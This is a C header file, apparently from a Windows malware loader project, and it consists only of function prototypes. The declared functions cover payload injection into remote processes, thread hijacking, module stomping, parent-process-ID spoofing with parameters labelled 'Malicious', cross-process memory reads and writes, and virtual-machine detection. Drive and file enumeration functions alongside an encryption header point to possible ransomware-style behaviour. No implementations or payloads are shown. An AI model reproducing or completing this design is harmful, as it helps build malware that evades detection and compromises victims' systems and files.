#pragma once
#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#include <Windows.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include "Encryption.h"
#include "Win32FindDataArray.h"
#include "resource.h"
#include <winternl.h>
#include <setupAPI.h>

#define		CRT_SECURE_NO_WARNINGS

typedef struct _RESOURCE
{
	PVOID  pAddress;
	size_t sSize;

}RESOURCE, *PRESOURCE;

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);

__kernel_entry NTSTATUS NTQuerySystemInformation
(
	IN              SYSTEM_INFORMATION_CLASS SystemInfomaionClass,
	IN OUT          PVOID                    SystemInformation,
	IN              ULONG                    SystemInformationLength,
	   OUT OPTIONAL PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI  *fnNTQueryProcessInformation)
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);

__kernel_entry NTSTATUS NTQueryProcessInformation
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);

BOOLEAN CreateDebuggedProcess
(
	IN     PCHAR   pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSuspendedProcess
(
	IN     PSTR    pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSacrificialThread
(
	   OUT PDWORD  pdwSacrificialThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
);

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAdress,
	IN     SIZE_T sPayloadSize
);

INT8 CheckVM
(
	IN     void
);

BOOLEAN FetchLocalAlertableThread
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwAlertedThreadId,
	   OUT PHANDLE phAlertedThreadHandle
);

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchRemoteThreadHandle
(
	IN     DWORD   dwProcessId,
	   OUT PDWORD  pdwThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchResource
(
	   OUT PRESOURCE pResource_t
);

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
);

BOOLEAN FetchProcess
(
	IN	   LPWSTR  pProcessName,
	IN     PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle
);

BOOLEAN EnumRemoteProcessHandle
(
	IN      LPCWSTR  szProcName,
	    OUT PDWORD   pdwPID,
	    OUT PHANDLE  phProcess 
);

BOOLEAN EnumProcessNTQuerySystemInformation
(
	IN     LPCWSTR szProcName,
	   OUT PDWORD pdwPid,
	   OUT PHANDLE phProcess
);

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN     LPWSTR pPath
);

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
    IN     LPWSTR pPath,
    IN OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t
);
VOID TestAllertAbleThread
(
	HANDLE hAlertableThreadHandle
);

HANDLE CreateVessel
(
	IN     LPWSTR pPath
);

BOOLEAN MapLocalMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pMappedAddress,
	   OUT SIZE_T  sPayloadSize,
	   OUT PHANDLE phFileMappingHandle 
);

BOOLEAN InjectPayloadRemoteMappedMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pRemoteMappedAddress,
	   OUT PUCHAR *pLocalMappedAddress,
	IN	   SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteFileMappingHandle,
	IN     HANDLE  hProcess
);

BOOL FetchStompingTarget
(
	IN     LPSTR  pSacrificialDllName,
	IN     LPSTR  pSacrificialFuncName,
	   OUT PVOID *pTargetFunctionAddress
);


BOOLEAN SpoofParentProcessId
(
	IN     LPSTR   pMaliciousProcessName, 
	IN     HANDLE  hDesiredParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
	   OUT PDWORD  pdwMaliciousProcessPID,
	   OUT PHANDLE phMaliciousProcessHandle,
	   OUT PDWORD  pdwMaliciousThreadId,
	   OUT PHANDLE phMaliciousThreadHandle
);

BOOLEAN SpoofParentProcessId2
(
	IN     LPWSTR   pSpoofedCommandLine,
	IN	   LPWSTR   pMaliciousCommandLine,
	   OUT PHANDLE phProcessHandle,
	   OUT PDWORD  pdwProcessId,
	   OUT PDWORD  pdwThreadId 
);

BOOLEAN ReadFromTargetProcess
(
	IN     HANDLE hTargetProcess, 
	IN     PVOID  pPEBBaseAddress, 
	   OUT PVOID *pReadBufferAddress, 
	IN     DWORD  dwBufferSize
);

BOOLEAN WriteToTargetProcess
(
	IN      HANDLE hProcess,
	IN      PVOID pAddressToWriteTo,
	IN      PVOID pBuffer,
	IN      DWORD dwBufferSize
);